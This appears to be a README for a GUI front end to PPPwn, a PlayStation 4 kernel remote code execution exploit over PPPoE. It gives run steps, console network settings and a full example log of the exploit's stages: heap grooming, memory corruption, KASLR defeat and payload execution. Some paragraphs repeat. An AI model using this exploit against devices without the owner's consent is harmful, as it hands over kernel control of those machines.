# PPPwn - PlayStation 4 PPPoE RCE
PPPwn is a kernel remote code execution exploit for PlayStation 4 up to FW 11.00. This is a proof-of-concept exploit for [CVE-2006-4304](https://hackerone.com/reports/2177925) that was reported responsibly to PlayStation.

Supported versions are:
- FW 9.00
- FW 9.50
- FW 10.00
- FW 10.50
- FW 11.00
- more can be added (PRs are welcome)

The exploit only prints `PPPwned` on your PS4 as a proof-of-concept. In order to launch Mira or similar homebrew enablers, the `stage2.bin` payload needs to be adapted.

## Requirements
- A computer with an Ethernet port
  - USB adapter also works
- Ethernet cable
- Npcap
  - get it [here](https://npcap.com/dist/npcap-1.79.exe)


## Usage

- Download the latest release

- Run the exploit on windows:
```sh
python main.py
```

choose a stage2.bin (custom ones from e.g. @LightningMods work too!)
Note: the stage files are all located in pppwn/stage1 & pppwn/stage2

## screenshots
![image](https://github.com/n0201/PPPwnGUI/assets/87095139/c7692d58-5a62-48c9-b992-495bd979c7cb)


## Note
- If there's no new output (e.g. the pppwn.py script is stuck at "Waiting for PADI", the GUI will freeze until a new output will be send)

- ### DO NOT CLICK THE EXPLOIT BUTTON JUST YET

- Now, simultaneously press the 'X' button on your controller on `Test Internet Connection` and the exploit button in the UI

If the exploit fails or the PS4 crashes, you can skip the internet setup and simply click on `Test Internet Connection`. Kill the `main.py` script and run it again on your computer, and then click on `Test Internet Connection` on your PS4: always simultaneously. (Note: The command prompt of the UI also runs the `pppwn.py` script, so it is enough to just close that console)


If the exploit works, you should see an output similar to below, and you should see `Cannot connect to network.` followed by `PPPwned` printed on your PS4, or the other way around. 

On your PS4:

- Go to `Settings` and then `Network`
- Select `Set Up Internet connection` and choose `Use a LAN Cable`
- Choose `Custom` setup and choose `PPPoE` for `IP Address Settings`
- Enter anything for `PPPoE User ID` and `PPPoE Password`
- Choose `Automatic` for `DNS Settings` and `MTU Settings`
- Choose `Do Not Use` for `Proxy Server`

- Now, simultaneously press the 'X' button on your controller on `Test Internet Connection` and 'Enter' on your keyboard (on the computer you have your Python script ready to run).

ALWAYS wait for you console to show the message "Cannot connect to network: (NW-31274-7)" before trying this PPOE injection again.

If the exploit fails or the PS4 crashes, you can skip the internet setup and simply click on `Test Internet Connection`. Kill the `pppwn.py` script and run it again on your computer, and then click on `Test Internet Connection` on your PS4: always simultaneously.


If the exploit works, you should see an output similar to below, and you should see `Cannot connect to network.` followed by `PPPwned` printed on your PS4, or the other way around. 

### Example run

```sh
[+] PPPwn - PlayStation 4 PPPoE RCE by theflow
[+] args: interface=enp0s3 fw=1100 stage1=stage1/stage1.bin stage2=stage2/stage2.bin

[+] STAGE 0: Initialization
[*] Waiting for PADI...
[+] pppoe_softc: 0xffffabd634beba00
[+] Target MAC: xx:xx:xx:xx:xx:xx
[+] Source MAC: 07:ba:be:34:d6:ab
[+] AC cookie length: 0x4e0
[*] Sending PADO...
[*] Waiting for PADR...
[*] Sending PADS...
[*] Waiting for LCP configure request...
[*] Sending LCP configure ACK...
[*] Sending LCP configure request...
[*] Waiting for LCP configure ACK...
[*] Waiting for IPCP configure request...
[*] Sending IPCP configure NAK...
[*] Waiting for IPCP configure request...
[*] Sending IPCP configure ACK...
[*] Sending IPCP configure request...
[*] Waiting for IPCP configure ACK...
[*] Waiting for interface to be ready...
[+] Target IPv6: fe80::2d9:d1ff:febc:83e4
[+] Heap grooming...done

[+] STAGE 1: Memory corruption
[+] Pinning to CPU 0...done
[*] Sending malicious LCP configure request...
[*] Waiting for LCP configure request...
[*] Sending LCP configure ACK...
[*] Sending LCP configure request...
[*] Waiting for LCP configure ACK...
[*] Waiting for IPCP configure request...
[*] Sending IPCP configure NAK...
[*] Waiting for IPCP configure request...
[*] Sending IPCP configure ACK...
[*] Sending IPCP configure request...
[*] Waiting for IPCP configure ACK...
[+] Scanning for corrupted object...found fe80::0fdf:4141:4141:4141

[+] STAGE 2: KASLR defeat
[*] Defeating KASLR...
[+] pppoe_softc_list: 0xffffffff884de578
[+] kaslr_offset: 0x3ffc000

[+] STAGE 3: Remote code execution
[*] Sending LCP terminate request...
[*] Waiting for PADI...
[+] pppoe_softc: 0xffffabd634beba00
[+] Target MAC: xx:xx:xx:xx:xx:xx
[+] Source MAC: 97:df:ea:86:ff:ff
[+] AC cookie length: 0x511
[*] Sending PADO...
[*] Waiting for PADR...
[*] Sending PADS...
[*] Triggering code execution...
[*] Waiting for stage1 to resume...
[*] Sending PADT...
[*] Waiting for PADI...
[+] pppoe_softc: 0xffffabd634be9200
[+] Target MAC: xx:xx:xx:xx:xx:xx
[+] AC cookie length: 0x0
[*] Sending PADO...
[*] Waiting for PADR...
[*] Sending PADS...
[*] Waiting for LCP configure request...
[*] Sending LCP configure ACK...
[*] Sending LCP configure request...
[*] Waiting for LCP configure ACK...
[*] Waiting for IPCP configure request...
[*] Sending IPCP configure NAK...
[*] Waiting for IPCP configure request...
[*] Sending IPCP configure ACK...
[*] Sending IPCP configure request...
[*] Waiting for IPCP configure ACK...

[+] STAGE 4: Arbitrary payload execution
[*] Sending stage2 payload...
[+] Done!
```
